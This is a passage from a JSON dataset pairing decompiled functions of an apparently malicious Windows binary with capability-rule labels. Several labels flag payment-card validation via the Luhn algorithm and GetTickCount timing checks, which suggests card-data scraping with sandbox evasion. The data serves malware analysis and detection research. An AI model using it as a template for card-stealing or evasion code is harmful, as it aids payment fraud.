uVar7, &var_834h);\n            var_4h_2._0_1_ = 0x11;\n            uVar7 = fcn.004064e0(&var_8a4h, uVar7, &var_850h);\n            var_4h_2._0_1_ = 0x12;\n            uVar7 = fcn.004064e0(&var_8c0h, uVar7, &var_888h);\n            var_4h_2 = CONCAT31(var_4h_2._1_3_, 0x13);\n            fcn.004063e0(uVar7);\n            if (0xf < var_8ach) {\n                fcn.0042a679(var_8c0h);\n            }\n            var_8ach = 0xf;\n            var_8b0h = 0;\n            var_8c0h = var_8c0h & 0xffffff00;\n            if (0xf < var_890h) {\n                fcn.0042a679(var_8a4h);\n            }\n            var_890h = 0xf;\n            var_894h = 0;\n            var_8a4h = var_8a4h & 0xffffff00;\n            if (0xf < var_8ech) {\n                fcn.0042a679(var_900h);\n            }\n            var_8ech = 0xf;\n            var_8f0h = 0;\n            var_900h = var_900h & 0xffffff00;\n            if (0xf < var_858h_2) {\n                fcn.0042a679(var_86ch_2);\n            }\n            var_858h_2 = 0xf;\n            var_85ch = 0;\n            var_86ch_2 = var_86ch_2 & 0xffffff00;\n            if (0xf < var_804h) {\n                fcn.0042a679(var_818h);\n            }\n            var_804h = 0xf;\n            var_808h = 0;\n            var_818h = var_818h & 0xffffff00;\n            if (0xf < var_7e8h) {\n                fcn.0042a679(var_7fch);\n            }\n            var_7e8h = 0xf;\n            var_7ech = 0;\n            var_7fch = var_7fch & 0xffffff00;\n            if (0xf < var_820h) {\n                fcn.0042a679(var_834h);\n            }\n            var_820h = 0xf;\n            var_824h = 0;\n            var_834h = var_834h & 0xffffff00;\n            if (0xf < var_83ch) {\n                fcn.0042a679(var_850h);\n            }\n            var_83ch = 0xf;\n            var_840h = 0;\n            var_850h = var_850h & 0xffffff00;\n            var_4h_2 = var_4h_2 & 0xffffff00;\n            if (0xf < var_874h) {\n                fcn.0042a679(var_888h);\n            }\n            (**0x463070)(0, 0, fcn.0040cec0, &var_a4ch, 0, 0);\n            (**0x462ea8)(60000);\n        }\n    }\n    fcn.0042a6e0(0x45247c, 0, 4);\n    fcn.004239f0();\n    fcn.0042a6e0(0x452480, 0, 4);\n    if (0xf < var_8d0h_2) {\n        fcn.0042a679(var_8e4h_2);\n    }\n    *in_FS_OFFSET = var_ch_2;\n    fcn.0042a75a(uVar6);\n    return;\n}\n",
        "token_count": 5264
    },
    "00411990": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004119f9) overlaps instruction at (ram,0x004119f8)\n// \n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00411990(void)\n\n{\n    code *pcVar1;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    int32_t extraout_EDX_02;\n    int32_t extraout_EDX_03;\n    int32_t extraout_EDX_04;\n    int32_t extraout_EDX_05;\n    int32_t extraout_EDX_06;\n    int32_t extraout_EDX_07;\n    int32_t extraout_EDX_08;\n    int32_t extraout_EDX_09;\n    int32_t extraout_EDX_10;\n    int32_t extraout_EDX_11;\n    int32_t extraout_EDX_12;\n    int32_t extraout_EDX_13;\n    int32_t extraout_EDX_14;\n    int32_t extraout_EDX_15;\n    int32_t extraout_EDX_16;\n    int32_t extraout_EDX_17;\n    int32_t extraout_EDX_18;\n    int32_t extraout_EDX_19;\n    int32_t extraout_EDX_20;\n    int32_t extraout_EDX_21;\n    int32_t extraout_EDX_22;\n    int32_t extraout_EDX_23;\n    int32_t extraout_EDX_24;\n    int32_t extraout_EDX_25;\n    uchar uVar2;\n    uint arg_8h;\n    uint var_4h;\n    \n    fcn.0042bc40();\n    pcVar1 = *0x440014;\n    (**0x440014)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    fcn.0042a6e0();\n    uVar2 = *0x10 == 0x20;\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x004119fd. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX + 8))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411a1f. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_00 + 8))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411a41. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_01 + 8))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    uVar2 = *0x10 == 0x80;\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411af5. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_02 + 8))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411b17. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_03 + 8))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411b39. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_04 + 8))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    fcn.00401f40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    uVar2 = *0x10 == 0xe0;\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411be0. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_05 + 8))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411c02. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_06 + 8))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411c24. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_07 + 8))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411c4c. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**0x12a5a10)();\n        return;\n    }\n    fcn.004246a0();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    uVar2 = *0x10 == 0x128;\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411ce2. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_08 + 8))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411d04. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_09 + 8))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411d26. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_10 + 8))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411d4e. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**0xff9b8810)();\n        return;\n    }\n    fcn.0040b8d0();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    uVar2 = *0x10 == 0x188;\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411dcc. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_11 + 8))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411dee. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_12 + 8))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411e10. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_13 + 8))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411e32. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_14 + 8))();\n        return;\n    }\n    fcn.0040b8d0();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    uVar2 = *0x10 == 0x1e8;\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411ece. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_15 + 8))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411ef0. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_16 + 8))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411f12. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_17 + 8))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411f34. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_18 + 8))();\n        return;\n    }\n    fcn.0040b8d0();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    fcn.0042bb40();\n    uVar2 = *0x10 == 0x248;\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411fd0. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_19 + 8))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411ff2. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_20 + 8))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00412014. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_21 + 8))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00412036. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_22 + 8))();\n        return;\n    }\n    fcn.00410d40();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00412058. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_23 + 8))();\n        return;\n    }\n    fcn.00401c60();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x0041207a. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_24 + 8))();\n        return;\n    }\n    fcn.00401c60();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x0041209c. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_25 + 8))();\n        return;\n    }\n    fcn.00401c60();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    arg_8h = 1;\n    (*pcVar1)();\n    (*pcVar1)();\n    fcn.0042a75a(arg_8h);\n    return;\n}\n",
        "token_count": 4244
    },
    "004125f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004125f0(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    char *var_ch;\n    \n    iVar1 = 0;\n    if (arg_8h != 0) {\n        if ((arg_8h < 0x80000000) && (iVar1 = fcn.0042b2b1(arg_8h * 2),  iVar1 != 0)) {\n            return iVar1;\n        }\n        arg_8h = 0;\n        fcn.0042ac29(&arg_8h);\n        var_ch = \"WSHS4954XGCLRNSRX\";\n        iVar1 = fcn.0042b331(&var_ch, 0x44c6c0);\n    }\n    return iVar1;\n}\n",
        "token_count": 177
    },
    "00412650": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412650(int32_t *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t **in_ECX;\n    int32_t *extraout_ECX;\n    int32_t **ppiVar4;\n    \n    piVar2 = in_ECX[4];\n    if (piVar2 < arg_8h) {\n        piVar2 = fcn.00429bcb(0x4452c0);\n        arg_8h = extraout_ECX;\n    }\n    uVar3 = piVar2 - arg_8h;\n    if (uVar3 < arg_ch) {\n        arg_ch = uVar3;\n    }\n    if (arg_ch != 0) {\n        ppiVar4 = in_ECX;\n        ppiVar1 = in_ECX;\n        if (0x7 < in_ECX[5]) {\n            ppiVar4 = *in_ECX;\n            ppiVar1 = *in_ECX;\n        }\n        fcn.0042adb0(ppiVar4 + arg_8h * 2, ppiVar1 + (arg_8h + arg_ch) * 2, (uVar3 - arg_ch) * 2);\n        piVar2 = in_ECX[4] - arg_ch;\n        in_ECX[4] = piVar2;\n        if (0x7 < in_ECX[5]) {\n            *(*in_ECX + piVar2 * 2) = 0;\n            return;\n        }\n        *(in_ECX + piVar2 * 2) = 0;\n    }\n    return;\n}\n",
        "token_count": 377
    },
    "00412860": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412860(int32_t **arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    int32_t arg_10h_00;\n    int32_t **arg_8h_00;\n    int32_t **in_ECX;\n    int32_t **extraout_ECX;\n    int32_t **extraout_ECX_00;\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    \n    piVar2 = arg_8h[4];\n    ppiVar1 = arg_8h;\n    if (piVar2 < arg_ch) {\n        fcn.00429bcb(0x4452c0);\n        ppiVar1 = extraout_ECX;\n    }\n    piVar2 = piVar2 - arg_ch;\n    if (arg_10h < piVar2) {\n        piVar2 = arg_10h;\n    }\n    if (in_ECX == ppiVar1) {\n        fcn.00412650(piVar2 + arg_ch, 0xffffffff);\n        fcn.00412650(0, arg_ch);\n        return;\n    }\n    if (0x7ffffffe < piVar2) {\n        fcn.00429b7e(0x4452ec);\n        ppiVar1 = extraout_ECX_00;\n    }\n    if (in_ECX[5] < piVar2) {\n        fcn.004126e0(piVar2, in_ECX[4]);\n        ppiVar1 = arg_8h;\n        if (piVar2 == NULL) {\n            return;\n        }\n    }\n    else if (piVar2 == NULL) {\n        in_ECX[4] = NULL;\n        if (0x7 < in_ECX[5]) {\n            **in_ECX = 0;\n            return;\n        }\n        *in_ECX = 0;\n        return;\n    }\n    if (0x7 < ppiVar1[5]) {\n        ppiVar1 = *ppiVar1;\n    }\n    arg_8h_00 = in_ECX;\n    if (0x7 < in_ECX[5]) {\n        arg_8h_00 = *in_ECX;\n    }\n    arg_10h_00 = piVar2 * 2;\n    fcn.0042a840(arg_8h_00, ppiVar1 + arg_ch * 2, arg_10h_00);\n    in_ECX[4] = piVar2;\n    if (in_ECX[5] < 0x8) {\n        *(arg_10h_00 + in_ECX) = 0;\n        return;\n    }\n    *(arg_10h_00 + *in_ECX) = 0;\n    return;\n}\n",
        "token_count": 616
    },
    "00412960": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412960(uint noname_0, uint *arg_ch)\n\n{\n    if (7 < arg_ch[5]) {\n        fcn.0042a679(*arg_ch);\n    }\n    arg_ch[5] = 7;\n    arg_ch[4] = 0;\n    *arg_ch = 0;\n    return;\n}\n",
        "token_count": 79
    },
    "00412990": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412990(uint *arg_8h, uint *arg_ch)\n\n{\n    if (arg_8h != arg_ch) {\n        do {\n            if (7 < arg_8h[5]) {\n                fcn.0042a679(*arg_8h);\n            }\n            arg_8h[5] = 7;\n            arg_8h[4] = 0;\n            *arg_8h = 0;\n            arg_8h = arg_8h + 7;\n        } while (arg_8h != arg_ch);\n    }\n    return;\n}\n",
        "token_count": 133
    },
    "004129d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004129d0(uint *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t arg_8h_00;\n    uint *puVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43dfe9;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h[5] = 0xf;\n    arg_8h[4] = 0;\n    *arg_8h = 0;\n    uVar1 = arg_8h[4];\n    arg_8h_00 = *(arg_ch + 0x10) + *(arg_10h + 0x10);\n    var_4h = 0;\n    if (((uVar1 <= arg_8h_00) && (arg_8h[5] != arg_8h_00)) && (cVar2 = fcn.00405d40(arg_8h_00, 1),  cVar2 != '\\0')) {\n        arg_8h[4] = uVar1;\n        puVar3 = arg_8h;\n        if (0xf < arg_8h[5]) {\n            puVar3 = *arg_8h;\n        }\n        *(puVar3 + uVar1) = 0;\n    }\n    fcn.00405df0(arg_ch, 0, 0xffffffff);\n    fcn.00405df0(arg_10h, 0, 0xffffffff);\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 404
    },
    "00412ad0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00412ad0(int32_t *param_1)\n\n{\n    int32_t arg_8h;\n    int32_t arg_ch;\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint var_4h;\n    \n    arg_8h = *param_1;\n    if (arg_8h != 0) {\n        arg_ch = param_1[1];\n        piVar1 = param_1 + 3;\n        piVar2 = param_1;\n        fcn.00412990(arg_8h, arg_ch);\n        fcn.0042a679(*param_1, arg_8h, arg_ch, piVar1, piVar2);\n    }\n    *param_1 = 0;\n    param_1[1] = 0;\n    param_1[2] = 0;\n    return;\n}\n",
        "token_count": 197
    },
    "00412b20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00412b20(int32_t param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint32_t *arg_ch;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uint32_t var_ch_2;\n    uint var_1ch;\n    uint32_t var_20h;\n    uint *var_28h;\n    uint var_38h;\n    uint32_t var_3ch;\n    uint var_44h;\n    uint var_258h;\n    uint var_254h;\n    uint32_t var_58h;\n    uint var_22ch;\n    uint var_168h;\n    uint var_158h;\n    uint var_154h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uint in_stack_fffffd5c;\n    uint in_stack_fffffd60;\n    uint in_stack_fffffd64;\n    uint *noname_4;\n    uint *arg_8h;\n    uint uVar5;\n    uint var_26ch;\n    uint *var_268h;\n    uint *var_264h;\n    uint var_260h;\n    uint *var_258h_2;\n    int32_t var_254h_2;\n    uint *var_250h;\n    uint32_t var_249h;\n    uint var_238h;\n    uint32_t var_234h;\n    uint32_t var_22ch_2;\n    uint var_21ch;\n    uint32_t var_218h;\n    uint32_t var_210h;\n    uint var_200h;\n    uint32_t var_1fch;\n    uint32_t var_1f4h;\n    uint var_1e4h;\n    uint32_t var_1e0h;\n    uint32_t var_1d8h;\n    uint var_1c8h;\n    uint32_t var_1c4h;\n    uint32_t var_1bch;\n    uint var_1ach;\n    uint32_t var_1a8h;\n    uint var_1a0h;\n    uint32_t var_18ch;\n    uint32_t var_184h;\n    uint32_t var_174h;\n    uint32_t var_170h;\n    uint32_t var_168h_2;\n    uint var_158h_2;\n    uint32_t var_154h_2;\n    uint32_t var_14ch;\n    uint var_13ch;\n    uint32_t var_138h;\n    uint32_t var_130h;\n    uint var_120h;\n    uint32_t var_11ch;\n    uint var_114h;\n    uint32_t var_10h_2;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h_2;\n    \n    uStack12 = 0x43e0f9;\n    var_ch_3 = *in_FS_OFFSET;\n    var_10h_2 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.00412b20::var_ch_3;\n    var_154h_2 = 0xf;\n    var_158h_2 = 0;\n    var_168h_2 = var_168h_2 & 0xffffff00;\n    var_4h_2._0_1_ = 3;\n    var_4h_2._1_3_ = 0;\n    if (param_1 == 0) {\n        uVar5 = 0x1a;\n    }\n    else {\n        uVar5 = 0x1c;\n    }\n    uVar5 = fcn.00420a40(uVar5);\n    uVar2 = fcn.0042ad20();\n    fcn.004062a0(uVar5, uVar2);\n    puVar3 = &fcn.00412b20::var_168h_2;\n    arg_8h = &fcn.00412b20::var_22ch_2;\n    noname_4 = 0x412bb2;\n    uVar5 = fcn.004129d0(arg_8h, puVar3, &fcn.00412b20::var_ch_2);\n    var_258h_2 = &stack0xfffffd5c;\n    var_4h_2._0_1_ = 4;\n    fcn.00412a90(&stack0xfffffd5c, uVar5, &fcn.00412b20::var_44h);\n    fcn.004244f0(&fcn.00412b20::var_268h, in_stack_fffffd5c, in_stack_fffffd60, in_stack_fffffd64, noname_4, arg_8h, \n                 puVar3);\n    var_4h_2 = CONCAT31(var_4h_2._1_3_, 6);\n    if (0xf < var_218h) {\n        fcn.0042a679(var_22ch_2);\n    }\n    var_218h = 0xf;\n    var_21ch = 0;\n    var_22ch_2 = var_22ch_2 & 0xffffff00;\n    var_258h_2 = var_264h;\n    var_250h = var_268h;\n    if (var_268h != var_264h) {\n        do {\n            var_1a8h = 7;\n            var_1ach = 0;\n            var_1bch = var_1bch & 0xffff0000;\n            fcn.00412860(var_250h, 0, 0xffffffff);\n            var_4h_2._0_1_ = 7;\n            uVar5 = fcn.00423cb0(&fcn.00412b20::var_1d8h, &fcn.00412b20::var_1bch);\n            var_4h_2._0_1_ = 8;\n            uVar2 = fcn.004129d0(&fcn.00412b20::var_210h, &fcn.00412b20::var_168h_2, &fcn.00412b20::var_ch_2);\n            var_4h_2 = CONCAT31(var_4h_2._1_3_, 9);\n            arg_ch = fcn.004064e0(&fcn.00412b20::var_1f4h, uVar2, uVar5);\n            uVar1 = var_184h;\n            var_170h = 0xf;\n            var_174h = 0;\n            var_184h = var_184h & 0xffffff00;\n            if (&fcn.00412b20::var_184h != arg_ch) {\n                var_170h = 0xf;\n                var_174h = 0;\n                var_184h = uVar1 & 0xffffff00;\n                if (arg_ch[5] < 0x10) {\n                    fcn.0042adb0(&fcn.00412b20::var_184h, arg_ch, arg_ch[4] + 1);\n                }\n                else {\n                    var_184h = *arg_ch;\n                    *arg_ch = 0;\n                }\n                var_174h = arg_ch[4];\n                var_170h = arg_ch[5];\n                arg_ch[4] = 0;\n                arg_ch[5] = 0;\n            }\n            if (0xf < var_1e0h) {\n                fcn.0042a679(var_1f4h);\n            }\n            var_1e0h = 0xf;\n            var_1e4h = 0;\n            var_1f4h = var_1f4h & 0xffffff00;\n            if (0xf < var_1fch) {\n                fcn.0042a679(var_210h);\n            }\n            var_1fch = 0xf;\n            var_200h = 0;\n            var_210h = var_210h & 0xffffff00;\n            var_4h_2._0_1_ = 0xe;\n            if (0xf < var_1c4h) {\n                fcn.0042a679(var_1d8h);\n            }\n            var_1c4h = 0xf;\n            var_1c8h = 0;\n            var_1d8h = var_1d8h & 0xffffff00;\n            uVar5 = fcn.00423cb0(&fcn.00412b20::var_1a0h, &fcn.00412b20::var_1bch);\n            var_4h_2._0_1_ = 0xf;\n            uVar2 = fcn.004129d0(&fcn.00412b20::var_130h, &fcn.00412b20::var_168h_2, &fcn.00412b20::var_ch_2);\n            var_4h_2._0_1_ = 0x10;\n            uVar5 = fcn.004064e0(&fcn.00412b20::var_14ch, uVar2, uVar5);\n            var_4h_2._0_1_ = 0x11;\n            puVar3 = fcn.00423d50(&fcn.00412b20::var_249h + 1, uVar5);\n            var_4h_2 = CONCAT31(var_4h_2._1_3_, 0x12);\n            if (7 < puVar3[5]) {\n                puVar3 = *puVar3;\n            }\n            iVar4 = fcn.00420980(puVar3);\n            if (7 < var_234h) {\n                